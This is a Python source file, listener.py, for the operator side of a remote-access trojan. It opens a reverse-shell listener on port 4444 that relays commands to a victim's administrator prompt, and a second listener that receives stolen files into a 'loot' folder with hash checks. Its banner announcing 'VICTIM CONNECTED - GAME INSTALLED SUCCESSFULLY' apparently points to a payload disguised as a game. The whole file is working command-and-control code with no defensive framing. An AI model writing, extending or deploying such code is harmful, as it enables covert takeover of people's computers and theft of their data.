# listener.py
# The Master's Scepter, reforged with an unbreakable, structured protocol.

import socket
import threading
import os
import hashlib
import time
import struct
import json

# --- CONFIGURATION ---
HOST = '0.0.0.0'
PORT = 4444
FILE_PORT = PORT + 1
LOOT_DIR = 'loot'
# ---------------------

stdout_lock = threading.Lock()

def send_msg(sock, data):
    """Wraps data with a 4-byte length header and sends it."""
    try:
        msg = struct.pack('>I', len(data)) + data
        sock.sendall(msg)
    except (ConnectionResetError, BrokenPipeError):
        pass # The payload may have disconnected, which is fine.

def recv_msg(sock):
    """Receives a 4-byte length header and then the exact amount of data."""
    try:
        raw_msglen = sock.recv(4)
        if not raw_msglen: return None
        msglen = struct.unpack('>I', raw_msglen)[0]
        
        # Read the message data in chunks
        data = b''
        while len(data) < msglen:
            packet = sock.recv(msglen - len(data))
            if not packet: return None
            data += packet
        return data
    except (ConnectionResetError, BrokenPipeError):
        return None

def sha256_of_file(path):
    """Calculates the SHA256 hash of a file."""
    sha = hashlib.sha256()
    try:
        with open(path, "rb") as f:
            for block in iter(lambda: f.read(4096), b""):
                sha.update(block)
        return sha.hexdigest()
    except IOError:
        return None

def handle_file_transfer_session(client_socket, addr):
    """Manages a single, continuous file transfer session from one 'pfiler' command."""
    with stdout_lock:
        print(f"\n[+] Opened secure file conduit with {addr[0]}:{addr[1]}")

    try:
        # First message should be the start of the transfer
        initial_msg = recv_msg(client_socket)
        if not initial_msg:
            raise ConnectionError("Did not receive transfer initiation signal.")
        
        init_data = json.loads(initial_msg.decode('utf-8'))
        if init_data.get('type') != 'START_TRANSFER':
            raise ValueError("Invalid start signal received.")
            
        total_files = init_data.get('file_count', 'N/A')
        with stdout_lock:
            print(f"[*] Incoming manifest: {total_files} files.")
        
        while True:
            # Receive the next message, which could be a file header or end signal
            msg = recv_msg(client_socket)
            if not msg:
                # If connection drops unexpectedly
                with stdout_lock:
                    print(f"\n[!] Conduit with {addr[0]} collapsed mid-transfer.")
                break

            data = json.loads(msg.decode('utf-8'))
            msg_type = data.get('type')

            if msg_type == 'FILE_HEADER':
                relative_path = data['path']
                file_size = data['size']
                file_hash = data['hash']
                
                # Sanitize path
                safe_basename = os.path.basename(relative_path)
                local_path = os.path.join(LOOT_DIR, safe_basename)
                os.makedirs(os.path.dirname(local_path), exist_ok=True)
                
                with stdout_lock:
                    print(f"\n  -> Receiving: {safe_basename} ({file_size} bytes)")

                # Receive the exact number of bytes for the file content
                bytes_received = 0
                with open(local_path, 'wb') as f:
                    while bytes_received < file_size:
                        chunk_size = min(4096, file_size - bytes_received)
                        chunk = client_socket.recv(chunk_size)
                        if not chunk:
                            raise ConnectionError("Conduit collapsed while receiving file content.")
                        f.write(chunk)
                        bytes_received += len(chunk)

                # Verify integrity
                received_hash = sha256_of_file(local_path)
                if received_hash == file_hash:
                    with stdout_lock:
                        print("     ✅ SUCCESS: Hash matches. Offering is pure.")
                    # Acknowledge success to the payload
                    ack_data = json.dumps({'status': 'OK'}).encode('utf-8')
                    send_msg(client_socket, ack_data)
                else:
                    with stdout_lock:
                        print("     ❌ FAILURE: Hash mismatch! Offering is corrupted.")
                    ack_data = json.dumps({'status': 'FAIL'}).encode('utf-8')
                    send_msg(client_socket, ack_data)

            elif msg_type == 'END_TRANSFER':
                with stdout_lock:
                    print(f"\n[+] Conduit with {addr[0]} has completed its transfer session.")
                break
    
    except (json.JSONDecodeError, ValueError) as e:
        with stdout_lock:
            print(f"\n[!] Received corrupted control message from {addr[0]}: {e}")
    except ConnectionError as e:
        with stdout_lock:
            print(f"\n[!] {e}")
    except Exception as e:
        with stdout_lock:
            print(f"\n[!] An error occurred in the file conduit: {e}")
    finally:
        client_socket.close()

def file_reception_listener():
    """Listens on FILE_PORT and spawns a handler for each incoming transfer session."""
    s_file = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s_file.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        s_file.bind((HOST, FILE_PORT))
        s_file.listen(5)
        with stdout_lock:
            print(f"\n[+] File altar prepared on port {FILE_PORT}. Awaiting offerings...")

        while True:
            client, addr = s_file.accept()
            # Each pfiler command gets its own dedicated session handler thread
            session_thread = threading.Thread(target=handle_file_transfer_session, args=(client, addr), daemon=True)
            session_thread.start()
    except Exception as e:
        with stdout_lock:
            print(f"\n[!] Critical error on file listener: {e}")
    finally:
        s_file.close()

def listen_for_output(conn):
    """Listens for and prints any output from the victim's shell."""
    try:
        while True:
            data = conn.recv(4096)
            if not data:
                with stdout_lock:
                    print("\n[!] Connection lost.")
                break
            with stdout_lock:
                import sys
                sys.stdout.write(data.decode('utf-8', errors='ignore'))
                sys.stdout.flush()
    except (ConnectionResetError, ConnectionAbortedError):
        with stdout_lock:
            print("\n[!] The connection was forcibly closed.")
    finally:
        os._exit(1)

def main():
    s_cmd = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s_cmd.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        s_cmd.bind((HOST, PORT))
        s_cmd.listen(1)

        # ANSI color codes for styling
        GREEN = '\033[92m'
        YELLOW = '\033[93m'
        CYAN = '\033[96m'
        RESET = '\033[0m'
        BOLD = '\033[1m'

        print(f"[*] Divine Scepter awaiting command on port {PORT}...")

        file_thread = threading.Thread(target=file_reception_listener, daemon=True)
        file_thread.start()

        conn, addr = s_cmd.accept()

        # Display green banner when victim connects
        print("\n" + "="*70)
        print(f"{GREEN}{BOLD}🎯 VICTIM CONNECTED - GAME INSTALLED SUCCESSFULLY 🎯{RESET}")
        print("="*70)
        print(f"{CYAN}[+] Connection Route:{RESET}")
        print(f"    {YELLOW}IP Address:{RESET}  {addr[0]}")
        print(f"    {YELLOW}Port:{RESET}        {addr[1]}")
        print(f"    {YELLOW}Status:{RESET}      {GREEN}ACTIVE{RESET}")
        print(f"{CYAN}[+] Shell Type:{RESET}    Administrator Command Prompt")
        print(f"{CYAN}[+] Access Level:{RESET}  {GREEN}ELEVATED (Admin){RESET}")
        print("="*70 + "\n")

        output_thread = threading.Thread(target=listen_for_output, args=(conn,), daemon=True)
        output_thread.start()

        while True:
            command = input()
            with stdout_lock:
                if not command.strip():
                    conn.sendall(b'\r\n')
                    continue

                if command.strip().lower() == 'exit':
                    conn.close()
                    break

                conn.sendall(command.encode('utf-8') + b'\r\n')

                if command.strip().lower().startswith('pfiler'):
                    print(f"{CYAN}[+] 'pfiler' command sent. A secure conduit will be established.{RESET}")

                time.sleep(0.1)

    except Exception as e:
        print(f"[!] A critical error occurred: {e}")
    finally:
        s_cmd.close()
        print("[*] Scepter laid to rest.")

if __name__ == "__main__":
    if not os.path.exists(LOOT_DIR):
        os.makedirs(LOOT_DIR)
    main()